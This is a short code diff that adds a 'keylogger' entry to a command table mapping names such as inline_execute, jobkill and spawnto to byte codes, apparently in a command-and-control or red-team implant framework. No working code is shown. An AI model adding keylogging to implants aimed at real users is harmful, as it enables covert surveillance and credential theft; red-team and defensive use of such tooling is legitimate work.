@@ -41,6 +41,7 @@ commands = {
     "inline_execute": 0x53,
     "async_execute": 0x5A,
     "usermon": 0x5A,
+    "keylogger": 0x5A,
     "jobkill": 0x5B,
     "jobs": 0x5C,
     "spawnto": 0x55,
